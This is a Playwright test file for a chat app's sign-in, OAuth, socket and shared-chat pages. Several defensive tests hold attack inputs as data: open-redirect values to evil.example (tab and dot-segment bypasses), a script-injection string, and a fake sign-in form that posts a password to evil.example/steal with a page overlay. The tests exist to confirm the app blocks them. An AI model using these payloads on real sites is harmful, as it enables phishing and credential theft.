import type { Page } from '@playwright/test';
import { fakeSocketServer } from './fake-socket';
import { expect, test } from './test';

const sessionUser = {
	id: 'u1',
	email: 'user@example.com',
	name: 'Test User',
	role: 'user',
	profile_image_url: '',
	token: 'signed-in-token',
	expires_at: Math.floor(Date.now() / 1000) + 3600
};

const baseConfig = {
	name: 'local-llm',
	version: 'test',
	// enable_notes: several tests land on /notes, which is gated on it.
	features: { auth: true, enable_login_form: true, enable_signup: true, enable_notes: true }
};

const mockConfig = (page: Page, config: object) =>
	page.route('**/api/config', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(config) })
	);

test('an anonymous visit to a protected route lands on /auth, and signing in returns to it', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/auths/signin', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/update/timezone', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
	);

	await page.goto('/notes');

	// useAuthGate navigates in-app (react-router), carrying the original path.
	await expect(page).toHaveURL(/\/auth\?redirect=%2Fnotes$/);
	await expect(page.getByText('Sign in to local-llm')).toBeVisible();

	await page.getByLabel('Email').fill('user@example.com');
	await page.getByLabel('Password').fill('hunter2');
	await page.getByRole('button', { name: 'Sign in' }).click();

	await expect(page).toHaveURL(/\/notes$/);
	await expect(page.getByRole('heading', { name: 'Notes' })).toBeVisible();
	expect(await page.evaluate(() => localStorage.getItem('token'))).toBe('signed-in-token');
});

test('a socket event sent right after signing in is not lost (#674)', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/auths/signin', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/update/timezone', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
	);
	const socket = await fakeSocketServer(page);

	await page.goto('/auth?redirect=%2Fnotes');
	await page.getByLabel('Email').fill('user@example.com');
	await page.getByLabel('Password').fill('hunter2');
	await page.getByRole('button', { name: 'Sign in' }).click();

	// The socket is created on the sign-in page but connects only once the
	// app's shell has mounted its listeners, so one alert sent at once lands.
	await socket.connected;
	socket.emit('events', {
		data: {
			type: 'calendar:alert',
			data: {
				event_id: 'e1',
				title: 'Dentist',
				description: '',
				start_at: 0,
				minutes_until: 5,
				calendar_id: 'personal',
				location: ''
			}
		}
	});
	const toast = page.locator('[data-sonner-toast]').filter({ hasText: 'Dentist' }).first();
	await expect(toast).toBeVisible();
	await expect(toast).toContainText('Starting in 5 minutes');
	await expect(page).toHaveURL(/\/notes$/);
});

test('a redirect that would leave the app is ignored: signing in lands home instead of failing', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/auths/signin', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/update/timezone', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
	);
	const errors: string[] = [];
	page.on('pageerror', (e) => errors.push(String(e)));

	await page.goto(`/auth?redirect=${encodeURIComponent('https://evil.example/pwned')}`);
	await page.getByLabel('Email').fill('user@example.com');
	await page.getByLabel('Password').fill('hunter2');
	await page.getByRole('button', { name: 'Sign in' }).click();

	await expect(page).toHaveURL(/localhost:5174\/$/);
	expect(errors.filter((e) => e.includes('External navigation'))).toEqual([]);
});

for (const [what, redirect] of [
	['a tab', '%2F%09%2Fevil.example%2Fpwned'],
	['a dot segment', '%2F.%2F%2Fevil.example%2Fpwned']
])
	test(`a redirect that ${what} turns into another host is ignored too: signing in lands home (#206)`, async ({
		page
	}) => {
		await mockConfig(page, baseConfig);
		await page.route('**/api/v1/auths/signin', (route) =>
			route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
		);
		await page.route('**/api/v1/auths/', (route) =>
			route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
		);
		await page.route('**/api/v1/auths/update/timezone', (route) =>
			route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
		);
		const errors: string[] = [];
		page.on('pageerror', (e) => errors.push(String(e)));

		// `/%09/evil.example` decodes to "/\t/evil.example", which URL parsing
		// reads as `//evil.example`; `/.//evil.example` resolves to that path.
		await page.goto(`/auth?redirect=${redirect}`);
		await page.getByLabel('Email').fill('user@example.com');
		await page.getByLabel('Password').fill('hunter2');
		await page.getByRole('button', { name: 'Sign in' }).click();

		await expect(page).toHaveURL(/localhost:5174\/$/);
		expect(errors.filter((e) => e.includes('External navigation'))).toEqual([]);
	});

test('a failed sign-in shows the backend error inline and stays on /auth', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/auths/signin', (route) =>
		route.fulfill({
			status: 400,
			contentType: 'application/json',
			body: JSON.stringify({ detail: 'Incorrect email or password' })
		})
	);

	await page.goto('/auth');
	await page.getByLabel('Email').fill('user@example.com');
	await page.getByLabel('Password').fill('wrong');
	await page.getByRole('button', { name: 'Sign in' }).click();

	await expect(page.getByText('Incorrect email or password')).toBeVisible();
	await expect(page).toHaveURL(/\/auth$/);
});

test('first-run onboarding is shown once config arrives, and leads into admin sign-up', async ({ page }) => {
	// Regression: AuthPage's one-shot mount logic used to run against a still-
	// null config and never re-run, so onboarding silently never appeared.
	await mockConfig(page, { ...baseConfig, onboarding: true });

	await page.goto('/auth');

	await expect(page.getByText('Welcome to local-llm')).toBeVisible();
	await page.getByRole('button', { name: 'Get Started' }).click();
	await expect(page.getByRole('button', { name: 'Create Admin Account' })).toBeVisible();
});

test('OAuth provider buttons are listed and point at the backend login URL', async ({ page }) => {
	await mockConfig(page, {
		...baseConfig,
		oauth: { providers: { github: 'GitHub', oidc: 'Acme SSO' } }
	});
	await page.route('**/oauth/github/login', (route) =>
		route.fulfill({ status: 200, contentType: 'text/html', body: 'oauth stub' })
	);

	await page.goto('/auth');
	await expect(page.getByRole('button', { name: 'Continue with GitHub' })).toBeVisible();
	// A provider with no hardcoded label falls back to SSO, not the raw key.
	await expect(page.getByRole('button', { name: 'Continue with SSO' })).toBeVisible();

	const request = page.waitForRequest('**/oauth/github/login');
	await page.getByRole('button', { name: 'Continue with GitHub' }).click();
	await request;
});

test('an OAuth callback (token cookie set by the backend) signs in and returns to the saved path', async ({
	page,
	context
}) => {
	await mockConfig(page, {
		...baseConfig,
		oauth: { providers: { github: 'GitHub' } }
	});
	await page.route('**/api/v1/auths/', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.route('**/api/v1/auths/update/timezone', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: '{}' })
	);
	await context.addCookies([{ name: 'token', value: 'cookie-token', url: 'http://localhost:5174' }]);
	await page.addInitScript(() => localStorage.setItem('redirectPath', '/notes'));

	await page.goto('/auth');

	await expect(page).toHaveURL(/\/notes$/);
	await expect(page.getByRole('heading', { name: 'Notes' })).toBeVisible();
	expect(await page.evaluate(() => localStorage.getItem('token'))).toBe('cookie-token');
});

test('an unreachable backend (no config) lands on /error', async ({ page }) => {
	await page.route('**/api/config', (route) =>
		route.fulfill({ status: 503, contentType: 'application/json', body: '{"detail":"down"}' })
	);

	await page.goto('/auth');

	await expect(page).toHaveURL(/\/error$/);
	await expect(page.getByText('Backend Required', { exact: false })).toBeVisible();
});

test('/watch forwards a video id to the chat home as ?youtube=', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/auths/', (route) =>
		route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) })
	);
	await page.addInitScript(() => localStorage.setItem('token', 'signed-in-token'));

	await page.goto('/watch?v=dQw4w9WgXcQ');

	await expect(page).toHaveURL(/\/\?youtube=dQw4w9WgXcQ$/);
});

test('a shared chat renders read-only for an anonymous viewer, sanitized, with no Clone button', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/chats/share/abc123', (route) =>
		route.fulfill({
			status: 200,
			contentType: 'application/json',
			body: JSON.stringify({
				id: 'chat-1',
				chat: {
					title: 'Explaining monads',
					timestamp: 1700000000000,
					models: ['qwen38'],
					history: {
						currentId: 'm2',
						messages: {
							m1: { id: 'm1', parentId: null, childrenIds: ['m2'], role: 'user', content: 'What is a monad?' },
							m2: {
								id: 'm2',
								parentId: 'm1',
								childrenIds: [],
								role: 'assistant',
								model: 'qwen38',
								content: 'A **monad** is a design pattern.<script>window.__xss = true</script>'
							}
						}
					}
				}
			})
		})
	);

	await page.goto('/s/abc123');

	await expect(page.getByRole('heading', { name: 'Explaining monads' })).toBeVisible();
	await expect(page.getByText('What is a monad?')).toBeVisible();
	await expect(page.locator('strong', { hasText: 'monad' })).toBeVisible();
	await expect(page.getByRole('button', { name: 'Clone Chat' })).toHaveCount(0);
	expect(await page.evaluate(() => (window as unknown as { __xss?: boolean }).__xss)).toBeUndefined();
	await expect(page).toHaveTitle('Explaining monads / local-llm');
});

test('a shared chat shows HTML in a message as text: no page styles, forms or overlays from the sharer', async ({
	page
}) => {
	await mockConfig(page, baseConfig);
	const attack =
		'Sign in again <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"></form><div style="position:fixed;inset:0">overlay</div>';
	await page.route('**/api/v1/chats/share/evil', (route) =>
		route.fulfill({
			status: 200,
			contentType: 'application/json',
			body: JSON.stringify({
				id: 'chat-2',
				chat: {
					title: 'Shared',
					timestamp: 1700000000000,
					history: {
						currentId: 'm1',
						messages: { m1: { id: 'm1', parentId: null, childrenIds: [], role: 'user', content: attack } }
					}
				}
			})
		})
	);

	await page.goto('/s/evil');

	const body = page.getByTestId('markdown');
	await expect(body).toContainText('<form action="https://evil.example/steal">');
	await expect(body.locator('style, form, input, [style]')).toHaveCount(0);
	expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe('rgb(1, 2, 3)');
});

test('an unknown share id sends an anonymous viewer to sign in, then back to it', async ({ page }) => {
	await mockConfig(page, baseConfig);
	await page.route('**/api/v1/chats/share/nope', (route) =>
		route.fulfill({ status: 404, contentType: 'application/json', body: '{"detail":"Not found"}' })
	);

	await page.goto('/s/nope');

	// The share may be limited to signed-in users, so an anonymous viewer is
	// asked to sign in and brought back; a signed-in one goes home instead.
	await expect(page).toHaveURL(/\/auth\?redirect=%2Fs%2Fnope$/);
});

test('/ui shows the interface standard to a signed-out visitor, with its colour promises measured', async ({
	page
}) => {
	await mockConfig(page, baseConfig);
	await page.addInitScript(() => localStorage.setItem('theme', 'dark'));
	await page.goto('/ui');

	await expect(page.getByRole('heading', { level: 1, name: 'Interface standard' })).toBeVisible();
	// The theme declares the colour scheme, so native controls follow the theme (COL-6).
	expect(await page.evaluate(() => getComputedStyle(document.documentElement).colorScheme)).toBe('dark');
	// Measured in this browser from the painted tokens, not parsed from the stylesheet.
	await expect(page.getByText(/^All \d+ colour promises hold in this theme\.$/)).toBeVisible();
	// The page itself never scrolls sideways (LAY-4).
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);

	await page.getByRole('button', { name: 'Light' }).click();
	await expect(page.locator('html')).toHaveClass(/light/);
	await expect(page.getByText(/^All \d+ colour promises hold in this theme\.$/)).toBeVisible();
});
